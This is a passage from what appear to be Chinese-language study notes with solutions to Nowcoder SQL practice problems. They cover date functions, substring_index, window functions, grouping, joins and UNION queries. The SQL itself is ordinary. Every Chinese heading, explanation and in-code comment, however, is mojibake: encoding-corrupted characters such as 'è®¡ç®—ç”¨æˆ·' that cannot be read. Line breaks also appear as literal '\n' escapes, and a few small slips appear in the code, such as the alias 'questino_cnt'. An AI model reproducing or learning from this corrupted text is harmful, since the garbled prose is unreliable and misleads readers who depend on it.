question_cnt\nFROM question_practice_detail\nWHERE YEAR(date)=\"2021\" and MONTH(date)=\"08\"\nGROUP BY day\n```\n\n#### SQL29 è®¡ç®—ç”¨æˆ·çš„å¹³å‡æ¬¡æ—¥ç•™å­˜ç‡-DATE_ADD\n\né¢˜ç›®åœ°å€ï¼š[è®¡ç®—ç”¨æˆ·çš„å¹³å‡æ¬¡æ—¥ç•™å­˜ç‡_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/126083961ae0415fbde061d7ebbde453?tpId=199&tqId=1975680&ru=%2Fpractice%2Fae44b2b78525417b8b2fc2075b557592&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\né¢˜è§£ï¼š\n\næ¬¡æ—¥ç•™å­˜ç‡ = å»é‡çš„æ•°æ®è¡¨ä¸­ç¬¦åˆæ¬¡æ—¥ç•™å­˜çš„æ¡ç›®æ•°ç›® / å»é‡çš„æ•°æ®è¡¨ä¸­æ‰€æœ‰æ¡ç›®æ•°ç›®\n\n```sql\nSELECT \n    COUNT(t2.device_id) / COUNT(t1.device_id) AS avg_ret \nFROM \n    (SELECT DISTINCT device_id, date FROM question_practice_detail)as t1\nLEFT JOIN\n    (SELECT DISTINCT device_id, date FROM question_practice_detail) AS t2\nON t1.device_id = t2.device_id AND t2.date = DATE_ADD(t1.date, interval 1 day)\n```\n\n#### SQL30 ç»Ÿè®¡æ¯ç§æ€§åˆ«çš„äººæ•°-substring_index\n\né¢˜ç›®åœ°å€ï¼š[ç»Ÿè®¡æ¯ç§æ€§åˆ«çš„äººæ•°_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/f04189f92f8d4f6fa0f383d413af7cb8?tpId=199&tqId=1975682&ru=/practice/126083961ae0415fbde061d7ebbde453&qru=/ta/sql-quick-study/question-ranking)\n\n**substring_indexå‡½æ•°**\n\n```sql\nsubstring_index(str,delim,count)\n```\n\n- str:è¦å¤„ç†çš„å­—ç¬¦ä¸²\n- delim:åˆ†éš”ç¬¦\n- count:è®¡æ•°\n\n```sql\nstr = 'www.wikidm.cn'\n\n//å–å‰é¢\nsubstring_index(str,'.',1)\nç»“æœæ˜¯ï¼šwww\n\nsubstring_index(str,'.',2)\nç»“æœæ˜¯ï¼šwww.wikidm\n\n//å–åé¢\nsubstring_index(str,'.',-1)\nç»“æœä¸ºï¼šcn\n\nsubstring_index(str,'.',-2)\nç»“æœä¸ºï¼šwikidm.cn\n\n//å–ä¸­é—´\nsubstring_index(substring_index(str,'.',-2),'.',1);\nç»“æœä¸ºï¼šwikidm\n```\n\né¢˜è§£1:\n\n```sql\nSELECT  substring_index(profile,',',-1) AS gender,  COUNT(*) AS number\nFROM user_submit\nGROUP BY gender\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT  CASE \n    WHEN `profile` LIKE \"%,male\" THEN 'male'\n    WHEN `profile` LIKE \"%,female\" THEN 'female'\n    END AS gender,  COUNT(device_id) AS number\nFROM user_submit\nGROUP BY gender\n```\n\né¢˜è§£3:\n\n```sql\nSELECT IF(profile LIKE '%female','female','male') gender,COUNT(*) number\nFROM user_submit\nGROUP BY gender;\n```\n\n#### SQL32 æˆªå–å‡ºå¹´é¾„-SUBSTR\n\né¢˜ç›®åœ°å€ï¼š[æˆªå–å‡ºå¹´é¾„_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/b8d8a87fe1fc415c96f355dc62bdd12f?tpId=199&tqId=1975684&ru=/practice/26c8715f32e24d918f15db69518f3ad8&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT \n    SUBSTRING_INDEX(SUBSTRING_INDEX(profile,',',-2),',',1) AS age,\n    COUNT(*) AS number \nFROM user_submit\nGROUP BY age\n```\n\n**SUBSTRå‡½æ•°**\n\næˆªå–å­—ç¬¦ä¸²\n\n```sql\nsubstr(string str,num start,num length);\n```\n\n- strä¸ºå­—ç¬¦ä¸²ï¼›\n- startä¸ºèµ·å§‹ä½ç½®ï¼›\n- lengthä¸ºé•¿åº¦ã€‚\n\né¢˜è§£2:\n\n```sql\nSELECT\n    SUBSTR(profile,12,2) AS age,\n    COUNT(*) AS number\nFROM user_submit\nGROUP BY age\n```\n\n#### SQL31 æå–åšå®¢URLä¸­çš„ç”¨æˆ·å-replace\n\né¢˜ç›®åœ°å€ï¼š[æå–åšå®¢URLä¸­çš„ç”¨æˆ·å_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/26c8715f32e24d918f15db69518f3ad8?tpId=199&tqId=1975683&ru=/practice/90778f5ab7d64d35a40dc1095ff79065&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT\n# æ›¿æ¢æ³• replace(string, 'è¢«æ›¿æ¢éƒ¨åˆ†','æ›¿æ¢åçš„ç»“æœ')\n  device_id, replace(blog_url,'http:/url/','') as user_name\n \n# åˆ é™¤æ³• trim('è¢«åˆ é™¤å­—æ®µ' from åˆ—å)\n# device_id, trim('http:/url/' from blog_url) as user_name\n \n# æˆªå–æ³• substr(string, start_point, length*å¯é€‰å‚æ•°*)\n# device_id, substr(blog_url,11,length(blog_url)-10) as user_nam\n\n# å­—æ®µåˆ‡å‰²æ³• substring_index(string, 'åˆ‡å‰²æ ‡å¿—', ä½ç½®æ•°ï¼ˆè´Ÿå·ï¼šä»åé¢å¼€å§‹ï¼‰)\n# device_id, substring_index(blog_url,'/',-1) as user_name\n \nFROM user_submit\n```\n\n#### SQL33 æ‰¾å‡ºæ¯ä¸ªå­¦æ ¡GPAæœ€ä½çš„åŒå­¦\n\né¢˜ç›®åœ°å€ï¼š[æ‰¾å‡ºæ¯ä¸ªå­¦æ ¡GPAæœ€ä½çš„åŒå­¦_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/90778f5ab7d64d35a40dc1095ff79065?tpId=199&tqId=1980672&ru=/practice/b8d8a87fe1fc415c96f355dc62bdd12f&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£1ï¼šç”¨ group by æŠŠå­¦æ ¡åˆ†ç»„ï¼Œç„¶åè®¡ç®—å¾—åˆ°æ¯ä¸ªå­¦æ ¡æœ€ä½ gpaï¼Œå†å»æ‰¾è¿™ä¸ªå­¦æ ¡é‡Œå’Œè¿™ä¸ª gpa ç›¸ç­‰çš„åŒå­¦ device_id\n\n```sql\nSELECT device_id,university,gpa\nFROM user_profile\nWHERE (university,gpa) \n    IN (SELECT university,MIN(gpa) FROM user_profile GROUP BY university)\nORDER BY university ASC\n```\n\né¢˜è§£2:çª—å£å‡½æ•°\n\n```sql\n<çª—å£å‡½æ•°> over (partition by <ç”¨äºåˆ†ç»„çš„åˆ—å>\n                order by <ç”¨äºæ’åºçš„åˆ—å>)\n```\n\nçª—å£å‡½æ•°è¯­æ³•ï¼š[é€šä¿—æ˜“æ‡‚çš„å­¦ä¼šï¼šSQLçª—å£å‡½æ•°](https://zhuanlan.zhihu.com/p/92654574)\n\n```sql\nSELECT device_id,university,gpa\nFROM (SELECT *,rank() over (partition by university\n                order by gpa) AS rk FROM user_profile)  AS uni_min\nWHERE uni_min.rk=1\nORDER BY university \n```\n\n### 06-ç»¼åˆç»ƒä¹ \n\n#### SQL34 ç»Ÿè®¡å¤æ—¦ç”¨æˆ·8æœˆç»ƒé¢˜æƒ…å†µ-SUMã€IF\n\né¢˜ç›®åœ°å€ï¼š[ç»Ÿè®¡å¤æ—¦ç”¨æˆ·8æœˆç»ƒé¢˜æƒ…å†µ_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/53235096538a456b9220fce120c062b3?tpId=199&tqId=1980673&ru=/practice/b8f30b239b454ed490367b53ea95607d&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT\n    t1.device_id,\n    t1.university,\n    SUM(IF(result IS NOT NULL, 1, 0)) AS questino_cnt,\n    SUM(IF(t2.result = \"right\",1,0)) AS right_question_cnt\nFROM \n    user_profile AS t1\n    LEFT JOIN question_practice_detail AS t2\n    ON t1.device_id = t2.device_id AND MONTH(t2.date) = 8\nWHERE  university = \"å¤æ—¦å¤§å­¦\"\nGROUP BY t1.device_id;\n```\n\n#### SQL35 æµ™å¤§ä¸åŒéš¾åº¦é¢˜ç›®çš„æ­£ç¡®ç‡-SUMã€IF\n\né¢˜ç›®åœ°å€ï¼š\n\né¢˜è§£ï¼š[é¢˜è§£ | #æµ™å¤§ä¸åŒéš¾åº¦é¢˜ç›®çš„æ­£ç¡®ç‡#_ç‰›å®¢åšå®¢ (nowcoder.net)](https://blog.nowcoder.net/n/7d54ab4a35994b0790b76a5de8b98369)\n\n```sql\nSELECT\n    difficult_level,\n    sum(if(t2.result='right', 1, 0)) / count(t2.question_id) as correct_rate\nFROM \n    user_profile AS t1\n    INNER JOIN question_practice_detail AS t2\n    ON t1.device_id = t2.device_id \n    INNER JOIN question_detail AS t3\n    ON t2.question_id = t3.question_id \nWHERE  university = \"æµ™æ±Ÿå¤§å­¦\"\nGROUP BY difficult_level\nORDER BY correct_rate\n```\n\n#### SQL39 21å¹´8æœˆä»½ç»ƒé¢˜æ€»æ•°-date_format\n\né¢˜ç›®åœ°å€ï¼š[21å¹´8æœˆä»½ç»ƒé¢˜æ€»æ•°_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/b8f30b239b454ed490367b53ea95607d?tpId=199&tqId=2002640&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£1ï¼šdate_format\n\n```sql\nSELECT \n    COUNT(DISTINCT device_id) AS did_cnt,\n    COUNT(question_id) AS question_cnt\nFROM question_practice_detail\nWHERE date_format(date, '%Y-%m')='2021-08'\n```\n\né¢˜è§£2ï¼šYEARã€MONTH\n\n```sql\nSELECT \n    COUNT(DISTINCT device_id) AS did_cnt,\n    COUNT(question_id) AS question_cnt\nFROM question_practice_detail\nWHERE YEAR(date) = 2021 AND MONTH(date) = 08\n```\n\né¢˜è§£3ï¼šLIKE\n\n```sql\nSELECT \n    COUNT(DISTINCT device_id) AS did_cnt,\n    COUNT(question_id) AS question_cnt\nFROM question_practice_detail\nWHERE date LIKE \"2021-08%\"\n```\n\n## äºŒã€SQLå¿…çŸ¥å¿…ä¼š\n\n- [x] ğŸŒŸå¿…çŸ¥å¿…ä¼šç¯‡ï¼š50é“é¢˜\n- [x] ğŸ•¸é¢˜ç›®åœ°å€ï¼š[ç‰›å®¢ç½‘](https://www.nowcoder.com/exam/oj?tab=SQLç¯‡&topicId=298)\n- [x] ğŸ“šé…å¥—ä¹¦ç±ï¼š[MySQLå¿…çŸ¥å¿…ä¼šï¼ˆæ–‡å­—ç‰ˆï¼‰.pdf](https://jwt1399.lanzouq.com/iqSWa011dw0d)\n- [x] ğŸš©å°ç®€è®¡åˆ’ï¼šé¢„è®¡3å¤©å†™å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š03-04 å®Œæˆ 26 é“ã€03-05 å®Œæˆ 24 é“\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-05 æå‰ä¸€å¤©å®ŒæˆğŸ¥³\n\n### 01-æ£€ç´¢æ•°æ®\n\n#### **SQL1** **ä» Customers è¡¨ä¸­æ£€ç´¢æ‰€æœ‰çš„ ID**\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_id FROM Customers\n```\n\n#### **SQL2** **æ£€ç´¢å¹¶åˆ—å‡ºå·²è®¢è´­äº§å“çš„æ¸…å•-DISTINCT**\n\né¢˜è§£ï¼š\n\n```sql\nSELECT DISTINCT prod_id FROM OrderItems\n```\n\n#### **SQL3** **ä»…æ£€ç´¢é¡¾å®¢çš„ID**\n\né¢˜è§£ï¼š\n\n```sql\nSELECT * FROM Customers\n-- SELECT cust_id FROM Customers\n```\n\n### 02-æ’åºæ£€ç´¢æ•°æ®\n\n#### SQL4 æ£€ç´¢é¡¾å®¢åç§°å¹¶ä¸”æ’åº-DESC\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_name FROM Customers ORDER BY cust_name DESC\n```\n\n#### SQL5 å¯¹é¡¾å®¢IDå’Œæ—¥æœŸæ’åº-DESC\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_id,order_num FROM Orders   ORDER BY cust_id,order_date DESC\n```\n\n#### SQL6 æŒ‰ç…§æ•°é‡å’Œä»·æ ¼æ’åº-DESC\n\né¢˜è§£ï¼š\n\n```sql\nSELECT quantity,item_price FROM OrderItems ORDER BY quantity DESC,item_price DESC;\n```\n\n#### SQL7 æ£€æŸ¥SQLè¯­å¥-DESC\n\né¢˜è§£ï¼š\n\n```sql\nSELECT vend_name \nFROM Vendors \nORDER BY vend_name DESC\n```\n\n### 03-è¿‡æ»¤æ•°æ®\n\n#### **SQL8** **è¿”å›å›ºå®šä»·æ ¼çš„äº§å“-=**\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_id,prod_name\nFROM Products\nWHERE prod_price = 9.49\n```\n\n#### SQL9 è¿”å›æ›´é«˜ä»·æ ¼çš„äº§å“->+\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_id,prod_name\nFROM Products\nWHERE prod_price >= 9\n```\n\n#### SQL10 è¿”å›äº§å“å¹¶ä¸”æŒ‰ç…§ä»·æ ¼æ’åº-BETWEEN AND\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name,prod_price\nFROM Products\nWHERE prod_price between 3 and 6\nORDER BY prod_price\n```\n\n#### SQL11 è¿”å›æ›´å¤šçš„äº§å“->=\n\né¢˜è§£ï¼š\n\n```sql\nSELECT DISTINCT order_num\nFROM OrderItems\nWHERE quantity >= 100\n```\n\n### 04-é«˜çº§æ•°æ®è¿‡æ»¤-in\n\n#### SQL12 æ£€ç´¢ä¾›åº”å•†åç§°-AND\n\né¢˜è§£ï¼š\n\n```sql\nSELECT vend_name\nFROM Vendors\nWHERE vend_country = 'USA'  AND vend_state = 'CA'\n```\n\n#### SQL13 æ£€ç´¢å¹¶åˆ—å‡ºå·²è®¢è´­äº§å“çš„æ¸…å•-IN\n\né¢˜è§£ï¼š\n\n```sql\nSELECT order_num,prod_id,quantity\nFROM OrderItems\nWHERE quantity >= 100 AND prod_id IN ('BR01','BR02','BR03')\nORDER BY prod_id,order_num\n```\n\n#### SQL14 è¿”å›æ‰€æœ‰ä»·æ ¼åœ¨3ç¾å…ƒåˆ°6ç¾å…ƒä¹‹é—´-BETWEEN AND\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name,prod_price\nFROM Products\nWHERE prod_price BETWEEN 3 AND 6\nORDER BY prod_price\n```\n\n#### SQL15 çº é”™2-AND\n\né¢˜è§£ï¼š\n\n```sql\nSELECT vend_name \nFROM Vendors \nWHERE vend_country = 'USA' AND vend_state = 'CA'\nORDER BY vend_name \n```\n\n### 05-ç”¨é€šé…ç¬¦è¿›è¡Œè¿‡æ»¤-like\n\n#### SQL16 æ£€ç´¢äº§å“åç§°å’Œæè¿°ï¼ˆä¸€ï¼‰-LIKE\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc LIKE \"%toy\"\n```\n\n#### SQL17 æ£€ç´¢äº§å“åç§°å’Œæè¿°ï¼ˆäºŒï¼‰-LIKE\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc NOT LIKE \"%toy\"\nORDER BY prod_name\n```\n\n#### SQL18 æ£€ç´¢äº§å“åç§°å’Œæè¿°ï¼ˆä¸‰ï¼‰-LIKE\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc LIKE \"%toy%\" AND prod_desc LIKE \"%carrots%\"\n```\n\n#### SQL19 æ£€ç´¢äº§å“åç§°å’Œæè¿°ï¼ˆå››ï¼‰-LIKE\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name,prod_desc\nFROM Products \nWHERE prod_desc LIKE \"%toy%carrots%\"\n```\n\n### 06-åˆ›å»ºè®¡ç®—å­—æ®µ\n\n#### SQL20 åˆ«å-AS\n\né¢˜è§£ï¼š\n\n```sql\nSELECT vend_id,vend_name AS vname,vend_address AS vaddress,vend_city AS vcity\nFROM Vendors \nORDER BY vname\n```\n\n#### SQL21 æ‰“æŠ˜-AS\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_id,prod_price,(prod_price * 0.9) AS sale_price\nFROM Products \n```\n\n### 07-ä½¿ç”¨å‡½æ•°å¤„ç†æ•°æ®\n\n#### SQL22 é¡¾å®¢ç™»å½•å-concatã€substringã€upper\n\né¢˜è§£ï¼š\n\n- å­—ç¬¦ä¸²çš„æˆªå–ï¼šsubstring(å­—ç¬¦ä¸²ï¼Œèµ·å§‹ä½ç½®ï¼Œæˆªå–å­—ç¬¦æ•°ï¼‰\n- å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼šconcat(å­—ç¬¦ä¸²1ï¼Œå­—ç¬¦ä¸²2ï¼Œå­—ç¬¦ä¸²3,...)\n- å­—æ¯å¤§å†™ï¼šupper(å­—ç¬¦ä¸²ï¼‰\n\n```sql\nSELECT \n    cust_id,\n    cust_name,\n    upper(concat(substring(cust_name,1,2),substring(cust_city,1,3))) AS user_login\nFROM Customers \n```\n\n#### SQL23 è¿”å› 2020 å¹´ 1 æœˆçš„æ‰€æœ‰è®¢å•çš„è®¢å•å·å’Œè®¢å•æ—¥æœŸ-date_format\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT order_num,order_date\nFROM Orders \nWHERE YEAR(order_date) = '2020' AND MONTH(order_date) = '1'\nORDER BY order_date\n```\n\né¢˜è§£2:\n\n```sql\nSELECT order_num,order_date\nFROM Orders \nWHERE date_format(order_date,'%Y-%m')='2020-01'\nORDER BY order_date\n```\n\n### 08-æ±‡æ€»æ•°æ®-sumã€countã€max\n\n#### SQL24 ç¡®å®šå·²å”®å‡ºäº§å“çš„æ€»æ•°-sum\n\né¢˜è§£ï¼š\n\n```sql\nSELECT  sum(quantity) AS items_ordered\nFROM OrderItems\n```\n\n#### SQL25 ç¡®å®šå·²å”®å‡ºäº§å“é¡¹ BR01 çš„æ€»æ•°-sum\n\né¢˜è§£ï¼š\n\n```sql\nSELECT sum(quantity) AS items_ordered\nFROM OrderItems\nWHERE prod_id ='BR01'\n```\n\n#### SQL26 ç¡®å®š Products è¡¨ä¸­ä»·æ ¼ä¸è¶…è¿‡ 10 ç¾å…ƒçš„æœ€è´µäº§å“çš„ä»·æ ¼-max\n\né¢˜è§£ï¼š\n\n```sql\nSELECT max(prod_price) AS max_price\nFROM Products\nWHERE prod_price <= 10\n```\n\n### 09-åˆ†ç»„æ•°æ®-group by\n\n#### SQL27 è¿”å›æ¯ä¸ªè®¢å•å·å„æœ‰å¤šå°‘è¡Œæ•°-count\n\né¢˜è§£ï¼š\n\n```sql\nSELECT order_num,count(order_num) AS order_lines\nFROM OrderItems\nGROUP BY order_num\nORDER BY order_lines\n```\n\n#### SQL28 æ¯ä¸ªä¾›åº”å•†æˆæœ¬æœ€ä½çš„äº§å“-min\n\né¢˜è§£ï¼š\n\n```sql\nSELECT vend_id, min(prod_price) AS cheapest_item\nFROM Products\nGROUP BY vend_id\nORDER BY cheapest_item\n```\n\n#### SQL29 ç¡®å®šæœ€ä½³é¡¾å®¢-HAVING\n\né¢˜è§£ï¼š\n\n```sql\nSELECT order_num\nFROM OrderItems\nGROUP BY order_num\nHAVING sum(quantity) >= 100\nORDER BY order_num\n```\n\n#### SQL30 ç¡®å®šæœ€ä½³é¡¾å®¢çš„å¦ä¸€ç§æ–¹å¼ï¼ˆä¸€ï¼‰-HAVING\n\né¢˜è§£ï¼š\n\n```sql\nSELECT order_num, sum(item_price*quantity) AS total_price\nFROM OrderItems\nGROUP BY order_num\nHAVING  total_price >= 1000\nORDER BY order_num\n```\n\n#### SQL31 çº é”™3-HAVING\n\né¢˜è§£ï¼š\n\n```sql\nSELECT order_num, COUNT(*) AS items \nFROM OrderItems \nGROUP BY order_num \nHAVING COUNT(*) >= 3 \nORDER BY items, order_num;\n```\n\n### 10-ä½¿ç”¨å­æŸ¥è¯¢\n\n#### SQL32 è¿”å›è´­ä¹°ä»·æ ¼ä¸º 10 ç¾å…ƒæˆ–ä»¥ä¸Šäº§å“çš„é¡¾å®¢åˆ—è¡¨\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_id\nFROM Orders \nWHERE order_num in(\n    SELECT order_num \n    FROM OrderItems \n    GROUP BY order_num \n    HAVING  SUM(item_price) >= 10\n)\n```\n\n#### SQL33 ç¡®å®šå“ªäº›è®¢å•è´­ä¹°äº† prod_id ä¸º BR01 çš„äº§å“ï¼ˆä¸€ï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_id,order_date\nFROM Orders \nWHERE order_num in(\n    SELECT order_num \n    FROM OrderItems \n    WHERE  prod_id = 'BR01'\n    ORDER BY cust_id,order_date\n)\n```\n\n#### SQL34 è¿”å›è´­ä¹° prod_id ä¸º BR01 çš„äº§å“çš„æ‰€æœ‰é¡¾å®¢çš„ç”µå­é‚®ä»¶ï¼ˆä¸€ï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nselect cust_email from Customers\nwhere cust_id in (select cust_id from Orders where order_num \nin (select order_num from OrderItems where prod_id='BR01'))\n```\n\n#### SQL35 è¿”å›æ¯ä¸ªé¡¾å®¢ä¸åŒè®¢å•çš„æ€»é‡‘é¢\n\né¢˜è§£ï¼š\n\n```sql\nselect cust_id, sum(quantity*item_price) total_ordered \nfrom OrderItems AS a, Orders AS b \nwhere a.order_num = b.order_num\ngroup by cust_id\norder by total_ordered desc\n```\n\n#### SQL36 ä» Products è¡¨ä¸­æ£€ç´¢æ‰€æœ‰çš„äº§å“åç§°ä»¥åŠå¯¹åº”çš„é”€å”®æ€»æ•°\n\né¢˜è§£ï¼š\n\n```sql\nselect prod_name, SUM(quantity) quant_sold \nfrom Products AS a, OrderItems AS b \nwhere a.prod_id = b.prod_id\ngroup by prod_name\n```\n\n### 11-è”ç»“è¡¨-whereã€join\n\n#### SQL37 è¿”å›é¡¾å®¢åç§°å’Œç›¸å…³è®¢å•å·\n\nè”ç»“è¡¨ï¼š\n\n- 1ã€ä½¿ç”¨whereã€‚ from è¡¨1ï¼Œè¡¨2 where è¡¨1.åˆ—åx = è¡¨2.åˆ—åx\n- 2ã€ä½¿ç”¨inner joinã€‚from è¡¨1 inner join è¡¨2 on è¡¨1.åˆ—åx=è¡¨2.åˆ—åx\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT cust_name,order_num\nFROM Customers,Orders\nWHERE Customers.cust_id = Orders.cust_id\nORDER BY cust_name,order_num\n```\n\né¢˜è§£2:\n\n```sql\nSELECT cust_name,order_num\nFROM Customers AS t1\nINNER JOIN Orders AS t2\nON t1.cust_id = t2.cust_id\nORDER BY cust_name,order_num\n```\n\n#### SQL38 è¿”å›é¡¾å®¢åç§°å’Œç›¸å…³è®¢å•å·ä»¥åŠæ¯ä¸ªè®¢å•çš„æ€»ä»·\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT cust_name,Orders.order_num, sum(quantity*item_price) AS OrderTotal\nFROM Customers,Orders,OrderItems\nWHERE Customers.cust_id = Orders.cust_id AND Orders.order_num = OrderItems.order_num \nGROUP BY cust_name,order_num\nORDER BY cust_name,order_num\n```\n\né¢˜è§£2ï¼š\n\n```sql\nselect cust_name,Orders.order_num,sum(quantity*item_price) as OrderTotal\nfrom Orders\ninner join Customers on Orders.cust_id = Customers.cust_id\ninner join OrderItems on Orders.order_num = OrderItems.order_num\ngroup by cust_name,Orders.order_num\norder by cust_name,Orders.order_num\n```\n\n#### SQL39 ç¡®å®šå“ªäº›è®¢å•è´­ä¹°äº† prod_id ä¸º BR01 çš„äº§å“ï¼ˆäºŒï¼‰\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT cust_id,order_date\nFROM OrderItems,Orders\nWHERE OrderItems.order_num = Orders.order_num AND prod_id = \"BR01\"\nORDER BY order_date\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT cust_id, order_date\nFROM Orders \nINNER JOIN OrderItems ON OrderItems.order_num = Orders.order_num\nWHERE prod_id = \"BR01\"\nORDER BY order_date \n```\n\n#### SQL40 è¿”å›è´­ä¹° prod_id ä¸º BR01 çš„äº§å“çš„æ‰€æœ‰é¡¾å®¢çš„ç”µå­é‚®ä»¶ï¼ˆäºŒï¼‰\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT cust_email\nFROM OrderItems,Orders,Customers\nWHERE OrderItems.order_num = Orders.order_num \nAND Orders.cust_id = Customers.cust_id AND prod_id = \"BR01\"\nORDER BY order_date\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT cust_email\nFROM Orders \nINNER JOIN OrderItems ON OrderItems.order_num = Orders.order_num\nINNER JOIN Customers ON Orders.cust_id = Customers.cust_id\nWHERE prod_id = \"BR01\"\nORDER BY order_date \n```\n\n#### SQL41 ç¡®å®šæœ€ä½³é¡¾å®¢çš„å¦ä¸€ç§æ–¹å¼ï¼ˆäºŒï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_name,sum(item_price*quantity) AS total_price\nFROM Orders \nINNER JOIN OrderItems ON OrderItems.order_num = Orders.order_num\nINNER JOIN Customers ON Orders.cust_id = Customers.cust_id\nGROUP BY Customers.cust_name\nHAVING total_price >= 1000\nORDER BY total_price \n```\n\n### 12-åˆ›å»ºé«˜çº§è”ç»“-Join\n\n#### SQL42 æ£€ç´¢æ¯ä¸ªé¡¾å®¢çš„åç§°å’Œæ‰€æœ‰çš„è®¢å•å·ï¼ˆä¸€ï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_name,order_num\nFROM Orders \nINNER JOIN Customers ON Customers.cust_id = Orders.cust_id\nORDER BY cust_name\n```\n\n#### SQL43 æ£€ç´¢æ¯ä¸ªé¡¾å®¢çš„åç§°å’Œæ‰€æœ‰çš„è®¢å•å·ï¼ˆäºŒï¼‰\n\n- å†…è”ç»“ï¼šinner joinã€‚å–ä¸¤åˆ—çš„äº¤é›†ã€‚\n- å¤–è”ç»“ï¼š\n- - left joinã€‚å·¦è¿æ¥ï¼Œä»¥å·¦è¾¹è¡¨çš„åˆ—ä¸ºä¸»ï¼Œå–ä¸¤åˆ—çš„äº¤é›†ï¼Œå¯¹äºä¸åœ¨å³è¾¹åˆ—å­˜åœ¨çš„åç§°å–nullã€‚\n- - right joinã€‚å³è¿æ¥ï¼Œä»¥å³è¾¹è¡¨çš„åˆ—ä¸ºä¸»ï¼Œå–ä¸¤åˆ—çš„äº¤é›†ï¼Œå¯¹äºä¸åœ¨å·¦è¾¹åˆ—å­˜åœ¨çš„åç§°å–nullã€‚\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_name,order_num\nFROM Customers \nLEFT JOIN Orders ON Customers.cust_id = Orders.cust_id\nORDER BY cust_name\n```\n\n#### SQL44 è¿”å›äº§å“åç§°å’Œä¸ä¹‹ç›¸å…³çš„è®¢å•å·\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name,order_num\nFROM Products \nLEFT JOIN  OrderItems ON Products.prod_id = OrderItems.prod_id\nORDER BY prod_name\n```\n\n#### SQL45 è¿”å›äº§å“åç§°å’Œæ¯ä¸€é¡¹äº§å“çš„æ€»è®¢å•æ•°\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name, COUNT(order_num) AS orders\nFROM Products \nLEFT JOIN  OrderItems ON Products.prod_id = OrderItems.prod_id\nGROUP BY prod_name\nORDER BY prod_name\n```\n\n#### SQL46 åˆ—å‡ºä¾›åº”å•†åŠå…¶å¯ä¾›äº§å“çš„æ•°é‡\n\n```sql\nSELECT Vendors.vend_id,COUNT(prod_id) AS prod_id\nFROM Vendors \nLEFT JOIN  Products ON Products.vend_id = Vendors.vend_id\nGROUP BY vend_id\nORDER BY vend_id\n```\n\n### 13-ç»„åˆæŸ¥è¯¢-union\n\n#### SQL47 å°†ä¸¤ä¸ª SELECT è¯­å¥ç»“åˆèµ·æ¥ï¼ˆä¸€ï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE quantity = 100\nUNION\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE prod_id LIKE \"BNBG%\"\n```\n\n#### SQL48 å°†ä¸¤ä¸ª SELECT è¯­å¥ç»“åˆèµ·æ¥ï¼ˆäºŒï¼‰\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE quantity = 100\nUNION\nSELECT prod_id,quantity\nFROM OrderItems\nWHERE prod_id LIKE \"BNBG%\"\nORDER BY prod_id\n```\n\n#### SQL49 ç»„åˆ Products è¡¨ä¸­çš„äº§å“åç§°å’Œ Customers è¡¨ä¸­çš„é¡¾å®¢åç§°\n\né¢˜è§£ï¼š\n\n```sql\nSELECT prod_name FROM Products\nUNION\nSELECT cust_name FROM Customers\nORDER BY prod_name\n```\n\n#### SQL50 çº é”™4\n\né¢˜è§£ï¼š\n\n```sql\nSELECT cust_name, cust_contact, cust_email FROM Customers \nWHERE 